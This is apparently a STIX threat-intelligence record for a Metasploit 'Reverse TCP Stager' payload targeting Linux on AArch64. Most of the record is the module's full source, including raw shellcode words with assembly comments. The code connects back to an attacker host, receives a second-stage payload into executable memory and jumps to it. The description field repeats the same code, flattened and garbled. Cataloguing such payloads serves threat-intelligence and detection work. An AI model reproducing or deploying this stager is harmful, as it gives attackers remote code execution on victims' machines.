{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4a1bde43-f9d9-4ddd-a53a-5d68b1fd33bd",
    "created": "2024-08-14T16:33:19.525215Z",
    "modified": "2024-08-14T16:33:19.525219Z",
    "name": "Reverse TCP Stager",
    "description": "Connect back to the attacker 'License'       => MSF_LICENSE 'Platform'      => 'linux' 'Arch'          => ARCH_AARCH64 'Handler'       => Msf::Handler::ReverseTcp 'Stager'        => { 'Offsets' => { 'LPORT' => [ 206, 'n'    ] 'LHOST' => [ 208, 'ADDR' ]  'Payload' => [ # Generated from external/source/shellcode/linux/aarch64/stager_sock_reverse.s 0xd2800040,          #  mov\tx0, #0x2                   \t// #2 0xd2800021,          #  mov\tx1, #0x1                   \t// #1 0xd2800002,          #  mov\tx2, #0x0                   \t// #0 0xd28018c8,          #  mov\tx8, #0xc6                  \t// #198 0xd4000001,          #  svc\t#0x0 0xaa0003ec,          #  mov\tx12, x0 0x100005a1,          #  adr\tx1, cc <sockaddr> 0xd2800202,          #  mov\tx2, #0x10                  \t// #16 0xd2801968,          #  mov\tx8, #0xcb                  \t// #203 0xd4000001,          #  svc\t#0x0 0x350004c0,          #  cbnz\tw0, c0 <failed> 0xaa0c03e0,          #  mov\tx0, x12 0xd10043ff,          #  sub\tsp, sp, #0x10 0x910003e1,          #  mov\tx1, sp 0xd2800082,          #  mov\tx2, #0x4                   \t// #4 0xd28007e8,          #  mov\tx8, #0x3f                  \t// #63 0xd4000001,          #  svc\t#0x0 0xb100041f,          #  cmn\tx0, #0x1 0x540003c0,          #  b.eq\tc0 <failed> 0xb94003e2,          #  ldr\tw2, [sp] 0xd34cfc42,          #  lsr\tx2, x2, #12 0x91000442,          #  add\tx2, x2, #0x1 0xd374cc42,          #  lsl\tx2, x2, #12 0xaa1f03e0,          #  mov\tx0, xzr 0xaa0203e1,          #  mov\tx1, x2 0xd28000e2,          #  mov\tx2, #0x7                   \t// #7 0xd2800443,          #  mov\tx3, #0x22                  \t// #34 0xaa1f03e4,          #  mov\tx4, xzr 0xaa1f03e5,          #  mov\tx5, xzr 0xd2801bc8,          #  mov\tx8, #0xde                  \t// #222 0xd4000001,          #  svc\t#0x0 0xb100041f,          #  cmn\tx0, #0x1 0x54000200,          #  b.eq\tc0 <failed> 0xb94003e4,          #  ldr\tw4, [sp] 0xf90003e0,          #  str\tx0, [sp] 0xaa0003e3,          #  mov\tx3, x0 0xaa0c03e0,          #  mov\tx0, x12 0xaa0303e1,          #  mov\tx1, x3 0xaa0403e2,          #  mov\tx2, x4 0xd28007e8,          #  mov\tx8, #0x3f                  \t// #63 0xd4000001,          #  svc\t#0x0 0xb100041f,          #  cmn\tx0, #0x1 0x540000c0,          #  b.eq\tc0 <failed> 0x8b000063,          #  add\tx3, x3, x0 0xeb000084,          #  subs\tx4, x4, x0 0x54fffee1,          #  b.ne\t90 <read_loop> 0xf94003e0,          #  ldr\tx0, [sp] 0xd63f0000,          #  blr\tx0 0xd2800000,          #  mov\tx0, #0x0                   \t// #0 0xd2800ba8,          #  mov\tx8, #0x5d                  \t// #93 0xd4000001,          #  svc\t#0x0 0x5c110002,          #  .word\t0x5c110002 0x0100007f,          #  .word\t0x0100007f ].pack(\"V*\")  )) end  def handle_intermediate_stage(conn, payload) print_status(\"Transmitting stage length value...(#{payload.length} bytes)\")  address_format = 'V'  # Transmit our intermediate stager conn.put( [ payload.length ].pack(address_format) )  return true end  end",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/stagers/linux/aarch64/reverse_tcp.rb",
            "external_id": "reverse_tcp.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\n\n###\n#\n# ReverseTcp\n# ----------\n#\n# Linux reverse TCP stager.\n#\n###\nmodule MetasploitModule\n\n  CachedSize = 212\n\n  include Msf::Payload::Stager\n\n  def initialize(info = {})\n    super(merge_info(info,\n      'Name'          => 'Reverse TCP Stager',\n      'Description'   => 'Connect back to the attacker',\n      'License'       => MSF_LICENSE,\n      'Platform'      => 'linux',\n      'Arch'          => ARCH_AARCH64,\n      'Handler'       => Msf::Handler::ReverseTcp,\n      'Stager'        =>\n        {\n          'Offsets' =>\n            {\n              'LPORT' => [ 206, 'n'    ],\n              'LHOST' => [ 208, 'ADDR' ],\n            },\n          'Payload' =>\n          [\n            # Generated from external/source/shellcode/linux/aarch64/stager_sock_reverse.s\n            0xd2800040,          #  mov\tx0, #0x2                   \t// #2\n            0xd2800021,          #  mov\tx1, #0x1                   \t// #1\n            0xd2800002,          #  mov\tx2, #0x0                   \t// #0\n            0xd28018c8,          #  mov\tx8, #0xc6                  \t// #198\n            0xd4000001,          #  svc\t#0x0\n            0xaa0003ec,          #  mov\tx12, x0\n            0x100005a1,          #  adr\tx1, cc <sockaddr>\n            0xd2800202,          #  mov\tx2, #0x10                  \t// #16\n            0xd2801968,          #  mov\tx8, #0xcb                  \t// #203\n            0xd4000001,          #  svc\t#0x0\n            0x350004c0,          #  cbnz\tw0, c0 <failed>\n            0xaa0c03e0,          #  mov\tx0, x12\n            0xd10043ff,          #  sub\tsp, sp, #0x10\n            0x910003e1,          #  mov\tx1, sp\n            0xd2800082,          #  mov\tx2, #0x4                   \t// #4\n            0xd28007e8,          #  mov\tx8, #0x3f                  \t// #63\n            0xd4000001,          #  svc\t#0x0\n            0xb100041f,          #  cmn\tx0, #0x1\n            0x540003c0,          #  b.eq\tc0 <failed>\n            0xb94003e2,          #  ldr\tw2, [sp]\n            0xd34cfc42,          #  lsr\tx2, x2, #12\n            0x91000442,          #  add\tx2, x2, #0x1\n            0xd374cc42,          #  lsl\tx2, x2, #12\n            0xaa1f03e0,          #  mov\tx0, xzr\n            0xaa0203e1,          #  mov\tx1, x2\n            0xd28000e2,          #  mov\tx2, #0x7                   \t// #7\n            0xd2800443,          #  mov\tx3, #0x22                  \t// #34\n            0xaa1f03e4,          #  mov\tx4, xzr\n            0xaa1f03e5,          #  mov\tx5, xzr\n            0xd2801bc8,          #  mov\tx8, #0xde                  \t// #222\n            0xd4000001,          #  svc\t#0x0\n            0xb100041f,          #  cmn\tx0, #0x1\n            0x54000200,          #  b.eq\tc0 <failed>\n            0xb94003e4,          #  ldr\tw4, [sp]\n            0xf90003e0,          #  str\tx0, [sp]\n            0xaa0003e3,          #  mov\tx3, x0\n            0xaa0c03e0,          #  mov\tx0, x12\n            0xaa0303e1,          #  mov\tx1, x3\n            0xaa0403e2,          #  mov\tx2, x4\n            0xd28007e8,          #  mov\tx8, #0x3f                  \t// #63\n            0xd4000001,          #  svc\t#0x0\n            0xb100041f,          #  cmn\tx0, #0x1\n            0x540000c0,          #  b.eq\tc0 <failed>\n            0x8b000063,          #  add\tx3, x3, x0\n            0xeb000084,          #  subs\tx4, x4, x0\n            0x54fffee1,          #  b.ne\t90 <read_loop>\n            0xf94003e0,          #  ldr\tx0, [sp]\n            0xd63f0000,          #  blr\tx0\n            0xd2800000,          #  mov\tx0, #0x0                   \t// #0\n            0xd2800ba8,          #  mov\tx8, #0x5d                  \t// #93\n            0xd4000001,          #  svc\t#0x0\n            0x5c110002,          #  .word\t0x5c110002\n            0x0100007f,          #  .word\t0x0100007f\n          ].pack(\"V*\")\n        }\n      ))\n  end\n\n  def handle_intermediate_stage(conn, payload)\n    print_status(\"Transmitting stage length value...(#{payload.length} bytes)\")\n\n    address_format = 'V'\n\n    # Transmit our intermediate stager\n    conn.put( [ payload.length ].pack(address_format) )\n\n    return true\n  end\n\nend\n"
}